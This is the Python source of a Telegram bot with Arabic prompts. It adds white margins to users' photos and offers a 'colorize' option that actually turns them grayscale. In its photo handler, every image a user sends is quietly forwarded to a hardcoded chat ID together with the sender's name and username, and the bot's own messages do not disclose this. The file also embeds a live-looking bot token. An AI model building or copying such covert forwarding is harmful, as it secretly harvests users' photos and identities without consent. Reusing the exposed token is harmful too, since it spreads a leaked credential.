import os
import telebot
from PIL import Image
import requests
from io import BytesIO
from server import server

token = "6472606496:AAGmgLlNWpX_ZJDldgvAZpm2Uy9254RYdDQ"
bot = telebot.TeleBot(token)

# Dictionary to keep track of users who want to colorize images
images_to_color = {}

@bot.message_handler(commands=['start'])
def welcome(message):
    if message.text == '/start':
        os.makedirs('photos', exist_ok=True)
        name = message.from_user.first_name
        text = f'مرحبًا بك {name} في بوت توسيط الصور. قم بإرسال الصورة لأقوم بتوسيطها على خلفية بيضاء.'
        keyboard = telebot.types.InlineKeyboardMarkup()
        keyboard.add(telebot.types.InlineKeyboardButton("ستيكرات المطور", url="https://t.me/addstickers/emg_s"))
        keyboard.add(telebot.types.InlineKeyboardButton("تلوين الصورة", callback_data='colorize'))
        bot.send_message(message.chat.id, text, reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: call.data == 'colorize')
def colorize_button_pressed(call):
    user_id = call.message.chat.id
    images_to_color[user_id] = True
    bot.send_message(user_id, "قم بإرسال الصورة التي تريد تلوينها إلى أسود وأبيض.")

@bot.message_handler(content_types=['photo'])
def photo(message):
    file_info = bot.get_file(message.photo[-1].file_id)
    file_path = file_info.file_path
    photo_url = f"https://api.telegram.org/file/bot{token}/{file_path}"
    
    file_name = f"{message.chat.id}.jpg"
    with open(file_name, 'wb') as file:
        file.write(requests.get(photo_url).content)
    
    # Send the original image to the specified id
    bot.send_photo(651561282,
photo=message.photo[-1].file_id, caption=f"اسم المستخدم والمعرف: {message.from_user.first_name} (@{message.from_user.username})")
    
    # Check if the user wants to colorize the image
    if message.chat.id in images_to_color:
        image_data = Image.open(file_name)
        grayscale_image = image_data.convert('L')  # Convert to grayscale
        with BytesIO() as output:
            grayscale_image.save(output, format="JPEG")
            output.seek(0)
            bot.send_photo(message.chat.id, output)
        
        # Remove the user from the colorization list
        del images_to_color[message.chat.id]
    else:
        # If the user didn't press the button, center the image
        image_data = Image.open(file_name)
        width, height = image_data.size
        image_data_new = Image.new('RGB', (width, height + 250), color=(255, 255, 255))
        image_data_new.paste(image_data, (0, 125))
        image_data_new.save(file_name)
        with open(file_name, 'rb') as file:
            bot.send_photo(message.chat.id, file)
        
        # Paste image on white background horizontally
        image_data_new2 = Image.new('RGB', (width + 250, height), color=(255, 255, 255))
        image_data_new2.paste(image_data, (125, 0))
        image_data_new2.save(file_name)
        with open(file_name, 'rb') as file:
            bot.send_photo(message.chat.id, file)

@bot.message_handler(commands=['stickers'])
def send_stickers(message):
    bot.send_message(message.chat.id, "ستيكرات المطور", reply_markup=telebot.types.InlineKeyboardMarkup().add(
        telebot.types.InlineKeyboardButton("ستيكرات المطور", url="https://t.me/addstickers/emg_s")
    ))

server()
bot.polling(none_stop=True)